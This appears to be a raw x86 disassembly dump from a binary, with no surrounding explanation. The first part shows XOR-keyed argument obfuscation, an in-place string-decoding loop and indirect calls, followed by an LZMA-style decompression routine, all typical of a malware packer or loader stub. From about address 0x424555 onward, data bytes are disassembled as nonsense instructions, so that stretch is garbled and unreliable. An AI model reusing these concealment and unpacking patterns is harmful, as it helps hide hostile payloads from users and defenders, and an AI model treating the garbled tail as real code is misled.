  423e3f:	jne    0x423f0a
  423e45:	lea    eax,[esi+0x29]
  423e48:	mov    WORD PTR [ebp-0x78],ax
  423e4c:	mov    eax,esi
  423e4e:	mov    WORD PTR [ebp-0x76],ax
  423e52:	add    eax,0x3b
  423e55:	mov    WORD PTR [ebp-0x74],ax
  423e59:	lea    eax,[esi-0x6]
  423e5c:	mov    WORD PTR [ebp-0x72],ax
  423e60:	add    eax,0x47
  423e63:	mov    ecx,eax
  423e65:	lea    eax,[esi-0x1d]
  423e68:	mov    WORD PTR [ebp-0x66],ax
  423e6c:	mov    eax,esi
  423e6e:	mov    WORD PTR [ebp-0x64],ax
  423e72:	add    eax,0xffffffe4
  423e75:	mov    WORD PTR [ebp-0x62],ax
  423e79:	mov    eax,0x44b
  423e7e:	mov    WORD PTR [ebp-0x60],ax
  423e82:	mov    eax,0x5664
  423e87:	mov    WORD PTR [ebp-0x5e],ax
  423e8b:	mov    eax,0x6104
  423e90:	mov    WORD PTR [ebp-0x5c],ax
  423e94:	lea    eax,[ebp-0xe0]
  423e9a:	push   eax
  423e9b:	mov    eax,DWORD PTR [ebp+0xc]
  423e9e:	mov    edi,0x75108a4
  423ea3:	xor    eax,edi
  423ea5:	add    eax,ebx
  423ea7:	push   eax
  423ea8:	mov    WORD PTR [ebp-0x70],cx
  423eac:	lea    ecx,[esi-0x1a]
  423eaf:	mov    edx,ecx
  423eb1:	lea    eax,[ebp-0x78]
  423eb4:	push   eax
  423eb5:	mov    eax,DWORD PTR [ebp-0x4]
  423eb8:	mov    eax,DWORD PTR [eax+0x198]
  423ebe:	mov    WORD PTR [ebp-0x6e],dx
  423ec2:	mov    edx,0x4f82
  423ec7:	mov    WORD PTR [ebp-0x6c],dx
  423ecb:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e25
  423ed2:	mov    DWORD PTR [ebp-0x5a],0x4e24f116
  423ed9:	mov    DWORD PTR [ebp-0xe0],0x1
  423ee3:	mov    DWORD PTR [ebp-0xdc],0x255
  423eed:	push   DWORD PTR [eax]
  423eef:	mov    eax,DWORD PTR [ebp+0x10]
  423ef2:	call   eax
  423ef4:	mov    DWORD PTR [ebp-0x8],eax
  423ef7:	mov    eax,DWORD PTR [ebp-0x8]
  423efa:	test   eax,eax
  423efc:	je     0x423f0f
  423efe:	xor    DWORD PTR ds:0x76586876,0x87687666
  423f08:	jmp    0x423f0f
  423f0a:	mov    edi,0x75108a4
  423f0f:	mov    eax,DWORD PTR [ebp-0x4]
  423f12:	mov    ecx,DWORD PTR [eax+0x18c]
  423f18:	xor    eax,eax
  423f1a:	cmp    DWORD PTR [ecx],eax
  423f1c:	jne    0x42418b
  423f22:	mov    ecx,DWORD PTR [ebp-0x4]
  423f25:	mov    ecx,DWORD PTR [ecx+0x17c]
  423f2b:	mov    DWORD PTR [ecx],eax
  423f2d:	mov    ecx,DWORD PTR [ebp-0x4]
  423f30:	mov    ecx,DWORD PTR [ecx+0x180]
  423f36:	mov    DWORD PTR [ecx],eax
  423f38:	mov    eax,0x4e69
  423f3d:	mov    WORD PTR [ebp-0x9c],ax
  423f44:	mov    eax,esi
  423f46:	mov    WORD PTR [ebp-0x9a],ax
  423f4d:	mov    eax,0x4e79
  423f52:	mov    WORD PTR [ebp-0x98],ax
  423f59:	add    eax,0xffffffc0
  423f5c:	mov    WORD PTR [ebp-0x96],ax
  423f63:	mov    eax,0x4f8e
  423f68:	mov    WORD PTR [ebp-0x94],ax
  423f6f:	mov    eax,0x4e3a
  423f74:	mov    WORD PTR [ebp-0x92],ax
  423f7b:	add    eax,0x45
  423f7e:	mov    WORD PTR [ebp-0x90],ax
  423f85:	mov    eax,0x4e24
  423f8a:	mov    WORD PTR [ebp-0x8e],ax
  423f91:	mov    eax,esi
  423f93:	mov    WORD PTR [ebp-0x8c],ax
  423f9a:	mov    eax,0x4e25
  423f9f:	mov    WORD PTR [ebp-0x8a],ax
  423fa6:	mov    eax,0x99f9
  423fab:	mov    WORD PTR [ebp-0x88],ax
  423fb2:	mov    eax,0x8d6a
  423fb7:	mov    WORD PTR [ebp-0x86],ax
  423fbe:	mov    eax,0xd66f
  423fc3:	mov    WORD PTR [ebp-0x84],ax
  423fca:	mov    eax,0xd78b
  423fcf:	mov    WORD PTR [ebp-0x82],ax
  423fd6:	mov    eax,0x27b4
  423fdb:	mov    WORD PTR [ebp-0x80],ax
  423fdf:	mov    eax,0x47b4
  423fe4:	mov    WORD PTR [ebp-0x7e],ax
  423fe8:	mov    eax,0x4e3b
  423fed:	push   0x8
  423fef:	mov    WORD PTR [ebp-0x7c],ax
  423ff3:	mov    DWORD PTR [ebp-0x10],0x316120f
  423ffa:	mov    DWORD PTR [ebp-0xc],0x7a150a1d
  424001:	lea    eax,[ebp-0x10]
  424004:	pop    ecx
  424005:	mov    dl,BYTE PTR [eax]
  424007:	xor    dl,0x79
  42400a:	sub    dl,0x3
  42400d:	mov    BYTE PTR [eax],dl
  42400f:	inc    eax
  424010:	dec    ecx
  424011:	jne    0x424005
  424013:	lea    eax,[ebp-0x10]
  424016:	mov    DWORD PTR [ebp-0xdc],eax
  42401c:	lea    eax,[ebp-0xe0]
  424022:	push   eax
  424023:	mov    eax,DWORD PTR [ebp+0xc]
  424026:	xor    eax,edi
  424028:	add    eax,ebx
  42402a:	push   eax
  42402b:	mov    eax,DWORD PTR [ebp-0x4]
  42402e:	add    eax,0x66
  424031:	push   eax
  424032:	mov    eax,DWORD PTR [ebp-0x4]
  424035:	mov    eax,DWORD PTR [eax+0x198]
  42403b:	mov    DWORD PTR [ebp-0xe0],0x1
  424045:	push   DWORD PTR [eax]
  424047:	mov    eax,DWORD PTR [ebp+0x10]
  42404a:	call   eax
  42404c:	mov    ecx,DWORD PTR [ebp+0x8]
  42404f:	xor    ecx,edi
  424051:	add    ecx,ebx
  424053:	mov    DWORD PTR [ebp-0x8],eax
  424056:	cmp    eax,ecx
  424058:	jne    0x424073
  42405a:	mov    eax,ds:0x33730bcf
  42405f:	or     eax,0x22150bce
  424064:	mov    ds:0x33730bcf,eax
  424069:	add    eax,0x3372e92e
  42406e:	mov    ds:0x33730bcf,eax
  424073:	mov    ecx,0x4f96
  424078:	mov    eax,ecx
  42407a:	mov    WORD PTR [ebp-0x40],ax
  42407e:	mov    eax,0x4e63
  424083:	mov    edx,eax
  424085:	mov    WORD PTR [ebp-0x3e],dx
  424089:	lea    edx,[ecx+0x5]
  42408c:	mov    WORD PTR [ebp-0x3c],dx
  424090:	add    edx,0xffffffe8
  424093:	mov    WORD PTR [ebp-0x3a],dx
  424097:	lea    edx,[ecx-0x9]
  42409a:	mov    WORD PTR [ebp-0x38],dx
  42409e:	add    edx,0xfffffffb
  4240a1:	mov    WORD PTR [ebp-0x36],dx
  4240a5:	lea    edx,[ecx+0x21]
  4240a8:	mov    WORD PTR [ebp-0x34],dx
  4240ac:	mov    WORD PTR [ebp-0x32],cx
  4240b0:	mov    ecx,esi
  4240b2:	mov    WORD PTR [ebp-0x30],cx
  4240b6:	lea    ecx,[edx-0x1]
  4240b9:	mov    edx,ecx
  4240bb:	mov    WORD PTR [ebp-0x54],dx
  4240bf:	mov    edx,eax
  4240c1:	mov    WORD PTR [ebp-0x52],dx
  4240c5:	add    edx,0x18
  4240c8:	mov    WORD PTR [ebp-0x50],dx
  4240cc:	mov    WORD PTR [ebp-0x4e],ax
  4240d0:	add    eax,0xa
  4240d3:	mov    WORD PTR [ebp-0x4c],ax
  4240d7:	mov    eax,0x4e68
  4240dc:	mov    WORD PTR [ebp-0x4a],ax
  4240e0:	lea    eax,[ecx-0x1f]
  4240e3:	mov    WORD PTR [ebp-0x48],ax
  4240e7:	mov    WORD PTR [ebp-0x46],cx
  4240eb:	mov    WORD PTR [ebp-0x44],si
  4240ef:	mov    eax,DWORD PTR [ebp+0x8]
  4240f2:	movzx  ecx,WORD PTR [ebp-0x54]
  4240f6:	xor    eax,edi
  4240f8:	add    eax,ebx
  4240fa:	xor    eax,ecx
  4240fc:	mov    WORD PTR [ebp-0x54],ax
  424100:	mov    eax,DWORD PTR [ebp+0x8]
  424103:	movzx  ecx,WORD PTR [ebp-0x40]
  424107:	xor    eax,edi
  424109:	add    eax,ebx
  42410b:	xor    eax,ecx
  42410d:	mov    WORD PTR [ebp-0x40],ax
  424111:	xor    eax,eax
  424113:	mov    WORD PTR [ebp-0xf4],ax
  42411a:	mov    WORD PTR [ebp-0x108],ax
  424121:	mov    edi,DWORD PTR [ebp+0x24]
  424124:	lea    eax,[ebp-0xf4]
  42412a:	lea    edx,[ebp-0x54]
  42412d:	mov    DWORD PTR [ebp-0xe0],0x2
  424137:	mov    DWORD PTR [ebp-0xdc],eax
  42413d:	call   0x426b53
  424142:	mov    DWORD PTR [ebp-0xd8],eax
  424148:	lea    eax,[ebp-0xe0]
  42414e:	push   eax
  42414f:	mov    eax,DWORD PTR [ebp+0xc]
  424152:	xor    eax,0x75108a4
  424157:	add    eax,ebx
  424159:	push   eax
  42415a:	lea    eax,[ebp-0x9c]
  424160:	push   eax
  424161:	push   DWORD PTR [ebp-0x8]
  424164:	mov    eax,DWORD PTR [ebp+0x10]
  424167:	call   eax
  424169:	mov    edi,DWORD PTR [ebp+0x24]
  42416c:	lea    eax,[ebp-0x108]
  424172:	lea    edx,[ebp-0x40]
  424175:	mov    DWORD PTR [ebp-0xdc],eax
  42417b:	call   0x426b53
  424180:	mov    DWORD PTR [ebp-0xd8],eax
  424186:	mov    edi,0x75108a4
  42418b:	mov    eax,DWORD PTR [ebp+0x14]
  42418e:	push   DWORD PTR [ebp-0x4]
  424191:	push   DWORD PTR [ebp+0x20]
  424194:	push   DWORD PTR [ebp+0x1c]
  424197:	push   DWORD PTR [ebp+0x18]
  42419a:	push   DWORD PTR [ebp+0x10]
  42419d:	push   DWORD PTR [ebp+0x8]
  4241a0:	push   DWORD PTR [ebp+0xc]
  4241a3:	call   0x4253f0
  4241a8:	test   eax,eax
  4241aa:	je     0x4241ee
  4241ac:	add    DWORD PTR [ebp-0x4],eax
  4241af:	push   DWORD PTR [ebp-0x4]
  4241b2:	lea    esi,[ebp+0x4]
  4241b5:	call   0x4245de
  4241ba:	mov    eax,DWORD PTR [ebp-0x4]
  4241bd:	mov    eax,DWORD PTR [eax+0x1c8]
  4241c3:	mov    eax,DWORD PTR [eax]
  4241c5:	xor    eax,edi
  4241c7:	add    eax,ebx
  4241c9:	mov    eax,DWORD PTR [ebp-0x4]
  4241cc:	jne    0x4241e4
  4241ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4241d1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4241d7:	push   DWORD PTR [ecx]
  4241d9:	mov    eax,DWORD PTR [eax+0x1d8]
  4241df:	call   DWORD PTR [eax+0x28]
  4241e2:	jmp    0x4241ee
  4241e4:	mov    eax,DWORD PTR [eax+0x17c]
  4241ea:	mov    eax,DWORD PTR [eax]
  4241ec:	add    DWORD PTR [esi],eax
  4241ee:	pop    edi
  4241ef:	pop    esi
  4241f0:	pop    ebx
  4241f1:	leave  
  4241f2:	ret    0x20
  4241f5:	push   edi
  4241f6:	push   esi
  4241f7:	push   ebx
  4241f8:	push   ebp
  4241f9:	mov    ebp,esp
  4241fb:	mov    eax,DWORD PTR [ebp+0x24]
  4241fe:	add    DWORD PTR [ebp+0x28],eax
  424201:	push   eax
  424202:	cld    
  424203:	mov    esi,DWORD PTR [ebp+0x18]
  424206:	add    DWORD PTR [ebp+0x1c],esi
  424209:	push   esi
  42420a:	mov    esi,DWORD PTR [ebp+0x14]
  42420d:	lods   eax,DWORD PTR ds:[esi]
  42420e:	xchg   edx,eax
  42420f:	push   edx
  424210:	mov    cl,BYTE PTR [esi-0x2]
  424213:	or     eax,0xffffffff
  424216:	shl    eax,cl
  424218:	not    eax
  42421a:	push   eax
  42421b:	mov    cl,dh
  42421d:	or     eax,0xffffffff
  424220:	shl    eax,cl
  424222:	not    eax
  424224:	push   eax
  424225:	add    cl,dl
  424227:	mov    edi,esi
  424229:	sub    esp,0xc
  42422c:	sub    eax,eax
  42422e:	inc    eax
  42422f:	push   eax
  424230:	push   eax
  424231:	push   eax
  424232:	push   eax
  424233:	push   eax
  424234:	push   edi
  424235:	sub    esi,esi
  424237:	push   esi
  424238:	or     ebx,0xffffffff
  42423b:	mov    eax,0x300
  424240:	shl    eax,cl
  424242:	lea    ecx,[eax+0x736]
  424248:	mov    eax,0x4000400
  42424d:	shr    ecx,1
  42424f:	rep stos DWORD PTR es:[edi],eax
  424251:	push   0x5
  424253:	pop    ecx
  424254:	call   0x42453f
  424259:	loop   0x424254
  42425b:	lea    esi,[esi]
  42425d:	lea    edi,[edi]
  42425f:	mov    edi,DWORD PTR [ebp-0x4]
  424262:	mov    eax,DWORD PTR [ebp-0x10]
  424265:	sub    edi,DWORD PTR [ebp+0x24]
  424268:	and    eax,edi
  42426a:	mov    DWORD PTR [ebp-0x18],eax
  42426d:	mov    al,0x0
  42426f:	call   0x424557
  424274:	jne    0x42430f
  42427a:	mov    cl,BYTE PTR [ebp-0xc]
  42427d:	and    edi,DWORD PTR [ebp-0x14]
  424280:	shl    edi,cl
  424282:	sub    cl,0x8
  424285:	neg    cl
  424287:	shr    esi,cl
  424289:	pop    eax
  42428a:	add    edi,esi
  42428c:	pop    esi
  42428d:	lea    edi,[edi+edi*2]
  424290:	shl    edi,0x8
  424293:	cmp    al,0x7
  424295:	pop    edx
  424296:	lea    ecx,[esi+edi*2+0xe6c]
  42429d:	push   ecx
  42429e:	push   esi
  42429f:	mov    esi,0x100
  4242a4:	push   eax
  4242a5:	mov    al,0x1
  4242a7:	jb     0x4242dd
  4242a9:	mov    edi,DWORD PTR [ebp-0x4]
  4242ac:	sub    edi,DWORD PTR [ebp-0x24]
  4242af:	movzx  edi,BYTE PTR [edi]
  4242b2:	mov    ebp,DWORD PTR [ebp-0x34]
  4242b5:	shl    edi,1
  4242b7:	mov    ecx,esi
  4242b9:	and    esi,edi
  4242bb:	add    ecx,esi
  4242bd:	lea    ebp,[ebp+ecx*2+0x0]
  4242c1:	call   0x424576
  4242c6:	mov    ecx,eax
  4242c8:	shr    esi,0x8
  4242cb:	and    ecx,0x1
  4242ce:	cmp    esi,ecx
  4242d0:	mov    esi,0x100
  4242d5:	jne    0x4242e5
  4242d7:	cmp    eax,esi
  4242d9:	jb     0x4242b2
  4242db:	jmp    0x4242f1
  4242dd:	mov    ebp,DWORD PTR [ebp-0x34]
  4242e0:	call   0x424576
  4242e5:	inc    eax
  4242e6:	inc    esi
  4242e7:	sub    eax,0x1
  4242ea:	sub    esi,0x1
  4242ed:	cmp    eax,esi
  4242ef:	jb     0x4242dd
  4242f1:	pop    edx
  4242f2:	inc    edx
  4242f3:	cmp    edx,0x5
  4242f6:	dec    edx
  4242f7:	mov    ecx,edx
  4242f9:	jb     0x42430a
  4242fb:	inc    edx
  4242fc:	cmp    edx,0xb
  4242ff:	dec    edx
  424300:	mov    cl,0x4
  424302:	dec    cl
  424304:	jb     0x42430a
  424306:	mov    cl,0x7
  424308:	dec    cl
  42430a:	sub    edx,ecx
  42430c:	push   edx
  42430d:	jmp    0x42435e
  42430f:	mov    al,0xc1
  424311:	dec    al
  424313:	call   0x424567
  424318:	jne    0x42432e
  42431a:	pop    eax
  42431b:	pop    edi
  42431c:	pop    edx
  42431d:	pop    ecx
  42431e:	pop    edx
  42431f:	pop    ecx
  424320:	push   DWORD PTR [esp]
  424323:	push   ecx
  424324:	push   edx
  424325:	mov    edx,0x664
  42432a:	mov    cl,0x0
  42432c:	jmp    0x4243a1
  42432e:	mov    al,0xcd
  424330:	dec    al
  424332:	call   0x424567
  424337:	jne    0x424367
  424339:	mov    al,0xf1
  42433b:	dec    al
  42433d:	call   0x424557
  424342:	jne    0x424397
  424344:	pop    eax
  424345:	cmp    al,0x7
  424347:	mov    al,0x9
  424349:	jb     0x42434d
  42434b:	mov    al,0xb
  42434d:	push   eax
  42434e:	mov    esi,DWORD PTR [ebp-0x4]
  424351:	sub    esi,DWORD PTR [ebp-0x24]
  424354:	cmp    esi,DWORD PTR [ebp+0x24]
  424357:	jb     0x42452e
  42435d:	lods   al,BYTE PTR ds:[esi]
  42435e:	mov    edi,DWORD PTR [ebp-0x4]
  424361:	stos   BYTE PTR es:[edi],al
  424362:	jmp    0x4244f5
  424367:	mov    al,0xd8
  424369:	call   0x424567
  42436e:	mov    esi,DWORD PTR [ebp-0x28]
  424371:	je     0x42438e
  424373:	mov    al,0xe4
  424375:	call   0x424567
  42437a:	mov    esi,DWORD PTR [ebp-0x2c]
  42437d:	je     0x424388
  42437f:	mov    esi,DWORD PTR [ebp-0x30]
  424382:	mov    ecx,DWORD PTR [ebp-0x2c]
  424385:	mov    DWORD PTR [ebp-0x30],ecx
  424388:	mov    ecx,DWORD PTR [ebp-0x28]
  42438b:	mov    DWORD PTR [ebp-0x2c],ecx
  42438e:	mov    ecx,DWORD PTR [ebp-0x24]
  424391:	mov    DWORD PTR [ebp-0x28],ecx
  424394:	mov    DWORD PTR [ebp-0x24],esi
  424397:	pop    eax
  424398:	pop    edi
  424399:	pop    ecx
  42439a:	mov    edx,0xa68
  42439f:	mov    cl,0x8
  4243a1:	add    edx,edi
  4243a3:	push   edx
  4243a4:	push   edi
  4243a5:	cmp    al,0x7
  4243a7:	mov    al,cl
  4243a9:	jb     0x4243ad
  4243ab:	add    al,0x3
  4243ad:	push   eax
  4243ae:	mov    ebp,DWORD PTR [ebp-0x34]
  4243b1:	call   0x424574
  4243b6:	jne    0x4243cc
  4243b8:	mov    eax,DWORD PTR [ebp-0x18]
  4243bb:	mov    edi,DWORD PTR [ebp-0x34]
  4243be:	shl    eax,0x3
  4243c1:	sub    ecx,ecx
  4243c3:	push   0x8
  4243c5:	pop    esi
  4243c6:	lea    edi,[edi+eax*2+0x4]
  4243ca:	jmp    0x424401
  4243cc:	mov    ebp,DWORD PTR [ebp-0x34]
  4243cf:	add    ebp,0x2
  4243d2:	call   0x424574
  4243d7:	jne    0x4243f1
  4243d9:	mov    eax,DWORD PTR [ebp-0x18]
  4243dc:	mov    edi,DWORD PTR [ebp-0x34]
  4243df:	shl    eax,0x3
  4243e2:	push   0x8
  4243e4:	pop    ecx
  4243e5:	push   0x8
  4243e7:	pop    esi
  4243e8:	lea    edi,[edi+eax*2+0x104]
  4243ef:	jmp    0x424401
  4243f1:	mov    edi,0x204
  4243f6:	add    edi,DWORD PTR [ebp-0x34]
  4243f9:	push   0x10
  4243fb:	pop    ecx
  4243fc:	mov    esi,0x100
  424401:	mov    DWORD PTR [ebp-0x1c],ecx
  424404:	sub    eax,eax
  424406:	inc    eax
  424407:	mov    ebp,edi
  424409:	call   0x424576
  42440e:	mov    ecx,eax
  424410:	sub    ecx,esi
  424412:	jb     0x424407
  424414:	add    DWORD PTR [ebp-0x1c],ecx
  424417:	cmp    DWORD PTR [ebp-0x3c],0x4
  42441b:	jae    0x4244d1
  424421:	add    DWORD PTR [ebp-0x3c],0x7
  424425:	mov    ecx,DWORD PTR [ebp-0x1c]
  424428:	cmp    ecx,0x4
  42442b:	jb     0x424430
  42442d:	push   0x3
  42442f:	pop    ecx
  424430:	mov    edi,DWORD PTR [ebp-0x38]
  424433:	shl    ecx,0x6
  424436:	sub    eax,eax
  424438:	inc    eax
  424439:	push   0x40
  42443b:	pop    esi
  42443c:	lea    edi,[edi+ecx*2+0x360]
  424443:	mov    ebp,edi
  424445:	call   0x424576
  42444a:	mov    ecx,eax
  42444c:	sub    ecx,esi
  42444e:	jb     0x424443
  424450:	mov    DWORD PTR [ebp-0x18],ecx
  424453:	mov    DWORD PTR [ebp-0x24],ecx
  424456:	cmp    ecx,0x4
  424459:	jb     0x4244ce
  42445b:	mov    esi,ecx
  42445d:	and    DWORD PTR [ebp-0x24],0x1
  424461:	shr    esi,1
  424463:	or     DWORD PTR [ebp-0x24],0x2
  424467:	dec    esi
  424468:	cmp    ecx,0xe
  42446b:	jae    0x424486
  42446d:	mov    eax,0x2af
  424472:	sub    eax,ecx
  424474:	mov    ecx,esi
  424476:	shl    BYTE PTR [ebp-0x24],cl
  424479:	add    eax,DWORD PTR [ebp-0x24]
  42447c:	shl    eax,1
  42447e:	add    eax,DWORD PTR [ebp-0x38]
  424481:	mov    DWORD PTR [ebp-0x34],eax
  424484:	jmp    0x4244b3
  424486:	sub    esi,0x4
  424489:	call   0x424533
  42448e:	shr    ebx,1
  424490:	shl    DWORD PTR [ebp-0x24],1
  424493:	cmp    DWORD PTR [ebp-0x20],ebx
  424496:	jb     0x42449e
  424498:	inc    DWORD PTR [ebp-0x24]
  42449b:	sub    DWORD PTR [ebp-0x20],ebx
  42449e:	dec    esi
  42449f:	jne    0x424489
  4244a1:	mov    eax,0x644
  4244a6:	add    eax,DWORD PTR [ebp-0x38]
  4244a9:	mov    DWORD PTR [ebp-0x34],eax
  4244ac:	shl    DWORD PTR [ebp-0x24],0x4
  4244b0:	push   0x4
  4244b2:	pop    esi
  4244b3:	sub    edi,edi
  4244b5:	inc    edi
  4244b6:	mov    eax,edi
  4244b8:	mov    ebp,DWORD PTR [ebp-0x34]
  4244bb:	call   0x424576
  4244c0:	test   al,0x1
  4244c2:	je     0x4244c7
  4244c4:	or     DWORD PTR [ebp-0x24],edi
  4244c7:	shl    edi,1
  4244c9:	dec    esi
  4244ca:	jne    0x4244b8
  4244cc:	jmp    0x4244ce
  4244ce:	inc    DWORD PTR [ebp-0x24]
  4244d1:	mov    ecx,DWORD PTR [ebp-0x1c]
  4244d4:	add    ecx,0x2
  4244d7:	mov    edi,DWORD PTR [ebp-0x4]
  4244da:	mov    eax,edi
  4244dc:	sub    eax,DWORD PTR [ebp+0x24]
  4244df:	cmp    DWORD PTR [ebp-0x24],eax
  4244e2:	ja     0x42452e
  4244e4:	mov    esi,edi
  4244e6:	sub    esi,DWORD PTR [ebp-0x24]
  4244e9:	mov    edx,DWORD PTR [ebp+0x28]
  4244ec:	lods   al,BYTE PTR ds:[esi]
  4244ed:	stos   BYTE PTR es:[edi],al
  4244ee:	cmp    edi,edx
  4244f0:	jae    0x4244f5
  4244f2:	dec    ecx
  4244f3:	jne    0x4244ec
  4244f5:	mov    DWORD PTR [ebp-0x4],edi
  4244f8:	movzx  esi,al
  4244fb:	cmp    edi,DWORD PTR [ebp+0x28]
  4244fe:	jb     0x42425f
  424504:	call   0x424533
  424509:	sub    eax,eax
  42450b:	lea    ebp,[esp+0x3c]
  42450f:	mov    edx,DWORD PTR [ebp+0x20]
  424512:	mov    esi,DWORD PTR [ebp-0x8]
  424515:	sub    esi,DWORD PTR [ebp+0x18]
  424518:	mov    DWORD PTR [edx],esi
  42451a:	mov    edx,DWORD PTR [ebp+0x2c]
  42451d:	mov    edi,DWORD PTR [ebp-0x4]
  424520:	sub    edi,DWORD PTR [ebp+0x24]
  424523:	mov    DWORD PTR [edx],edi
  424525:	leave  
  424526:	pop    ebx
  424527:	pop    esi
  424528:	pop    edi
  424529:	ret    0x1c
  42452c:	pop    esi
  42452d:	pop    eax
  42452e:	sub    eax,eax
  424530:	inc    eax
  424531:	jmp    0x42450b
  424533:	cmp    ebx,0x1000000
  424539:	jb     0x42453c
  42453b:	ret    
  42453c:	shl    ebx,0x8
  42453f:	push   esi
  424540:	mov    esi,DWORD PTR [ebp-0x8]
  424543:	cmp    esi,DWORD PTR [ebp+0x1c]
  424546:	jae    0x42452c
  424548:	mov    eax,DWORD PTR [ebp-0x20]
  42454b:	shl    eax,0x8
  42454e:	lods   al,BYTE PTR ds:[esi]
  42454f:	mov    DWORD PTR [ebp-0x20],eax
  424552:	mov    DWORD PTR [ebp-0x8],esi
  424555:	sbb    BYTE PTR [edi+0x6bbe29f7],bh
  42455b:	sar    BYTE PTR [edx+0x7f7e9dbd],0x31
  424562:	xchg   edx,eax
  424563:	jg     0x424522
  424565:	xchg   edi,eax
  424566:	jo     0x4245d3
  424568:	sar    BYTE PTR [edx-0x841ce81],0x9
  42456f:	mov    dl,0xe9
  424571:	push   ss
  424572:	xor    DWORD PTR [edx+0x57],edi
  424575:	mov    edx,0x7a3116e9
  42457a:	std    
  42457b:	xchg   DWORD PTR [edx+0x7a],edi
  42457e:	jp     0x4245fd
  424580:	pcmpgtd mm6,mm7
  424583:	ss pop esi
  424585:	inc    edx
  424586:	mov    ebp,0x725a5e1e
  42458b:	inc    edi
  42458c:	ss pop esi
  42458e:	es (bad) 
  424591:	hlt    
  424592:	ins    DWORD PTR es:[edi],dx
  424593:	jnp    0x4245d3
  424595:	pop    esi
  424596:	inc    edx
  424597:	mov    ebp,0x2ef2729f
  42459c:	pop    esi
  42459d:	pop    edx
  42459e:	div    DWORD PTR [edi+0x7a21c36b]
  4245a4:	mov    ebp,0xcb6b7795
  4245a9:	mov    ah,0x45
  4245ab:	ss pop esi
  4245ad:	pop    edx
  4245ae:	packsswb mm6,mm7
  4245b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245b2:	lds    edi,FWORD PTR [edx+0x72]
  4245b5:	jp     0x424631
  4245b7:	push   edi
  4245b8:	mov    ah,0xbd
  4245ba:	xchg   ebp,eax
  4245bb:	jno    0x4245cd
  4245bd:	jge    0x4245e8
  4245bf:	jp     0x424640
  4245c1:	mov    edx,0x3a5e16e9
  4245c6:	mov    edi,0x557194bd
  4245cb:	ss pop esi
  4245cd:	pop    edx
  4245ce:	push   edi
  4245cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245d0:	adc    BYTE PTR [ebp+0x21],dl
  4245d3:	jp     0x424654
  4245d5:	mov    edx,0xe97dbaff
  4245da:	push   ss
  4245db:	pop    esi
  4245dc:	cmp    bh,BYTE PTR [edi-0x26908df]
  4245e2:	xchg   esi,eax
  4245e3:	push   esi
  4245e4:	jge    0x424660
  4245e6:	jp     0x424617
  4245e8:	and    BYTE PTR [ebx],ah
  4245ea:	mov    bl,0x31
  4245ec:	mov    cl,dl
  4245ee:	icebp  
  4245ef:	out    0x82,al
  4245f1:	mov    bl,0x31
  4245f3:	xchg   edx,eax
  4245f4:	int    0xf1
  4245f6:	out    0x82,al
  4245f8:	div    DWORD PTR [ecx]
  4245fa:	jb     0x4245f1
  4245fc:	xor    DWORD PTR [edx-0x9],esi
  4245ff:	sub    DWORD PTR [edx+0x2d72dec7],ecx
  424605:	jae    0x424656
  424607:	mov    bh,0xc2
  424609:	xchg   esi,eax
  42460a:	or     al,0x4c
  42460c:	jp     0x42468d
  42460e:	mov    dl,0xf5
  424610:	sub    DWORD PTR [esi+0x4f8a29f7],ebp
  424616:	mov    bh,0x7f
  424618:	mov    dl,0xf5
  42461a:	sub    DWORD PTR [esi+0x4f8a29f7],edi
  424620:	mov    bh,0x7f
  424622:	mov    dl,0xf5
  424624:	sub    DWORD PTR [edx+0x4f8a29f7],edi
  42462a:	mov    bh,0x7f
  42462c:	mov    dl,0xf5
  42462e:	jmp    0x7bbdc185
  424633:	mov    bl,0x31
  424635:	retf   0x71ca
  424638:	fild   DWORD PTR [edx-0x3545ce4d]
  42463e:	shl    esi,0x82
  424641:	mov    bl,0x31
  424643:	(bad)  
  424644:	(bad)  
  424645:	icebp  
  424646:	out    0x82,al
  424648:	adc    al,0x51
  42464a:	and    eax,0xf5b229f5
  42464f:	sub    DWORD PTR [edx-0xadaeeec],esi
  424655:	sub    DWORD PTR [edx-0x4c4dd60b],esi
  42465b:	xor    DWORD PTR [edx+0x7a7a7a29],esi
  424661:	mov    bl,0x31
  424663:	mov    dl,0x3f
  424665:	jp     0x4246e1
  424667:	jp     0x424660
  424669:	sub    DWORD PTR [edx-0x4d8048b1],ecx
  42466f:	cmc    
  424670:	sub    DWORD PTR [edx+0x4f8a29f7],esi
  424676:	mov    bh,0x7f
  424678:	mov    dl,0xf5
  42467a:	sub    DWORD PTR [edx+0x22a231b3],esi
  424680:	jl     0x4246fc
  424682:	jp     0x424637
  424684:	xor    DWORD PTR [edx+0x7a7a7a40],ebx
  42468a:	mov    bl,0x31
  42468c:	xchg   esi,eax
  42468d:	add    al,0x7a
  42468f:	jp     0x42470b
  424691:	jmp    0x7bbad54f
  424696:	jnp    0x424681
  424698:	shr    DWORD PTR [esi-0x6d848488],0xb9
  42469f:	jbe    0x42471b
  4246a1:	jp     0x42471e
  4246a3:	sub    DWORD PTR [esi+0x297b9401],edx
  4246a9:	call   0x1a2:0x297b9801
  4246b0:	lods   al,BYTE PTR ds:[esi]
  4246b1:	mov    bl,0x31
  4246b3:	mov    ds:0x7a7a3a68,al
  4246b8:	div    DWORD PTR [ecx]
  4246ba:	mov    cl,BYTE PTR [edi-0x41]
  4246bd:	mov    eax,0x7a4c0c96
  4246c2:	jg     0x424674
  4246c4:	cmc    
  4246c5:	xor    DWORD PTR [esi-0x75ce09],ebx
  4246cb:	rcl    DWORD PTR [esi],1
  4246cd:	jnp    0x42474a
  4246cf:	jnp    0x42474b
  4246d1:	dec    edi
  4246d2:	mov    edi,0x31f5b07f
  4246d7:	mov    dh,0x1e
  4246d9:	frstor [edx+0x7a]
  4246dc:	jp     0x424758
  4246de:	cmc    
  4246df:	icebp  
  4246e0:	push   ss
  4246e1:	jnp    0x42475e
  4246e3:	jnp    0x4246dc
  4246e5:	cmp    cl,BYTE PTR [edx-0xb]
  4246e8:	icebp  
  4246e9:	dec    esi
  4246ea:	jnp    0x424767
  4246ec:	jnp    0x4246e5
  4246ee:	cmp    dh,BYTE PTR [esi-0xb]
  4246f1:	icebp  
  4246f2:	cmp    bh,BYTE PTR [ebx+0x7b]
  4246f5:	jnp    0x4246ee
  4246f7:	xor    DWORD PTR [edx-0x17],esi
  4246fa:	jmp    0x7bbdc215
  4246ff:	cmc    
  424700:	repnz fidivr DWORD PTR [ebp+0x7a]
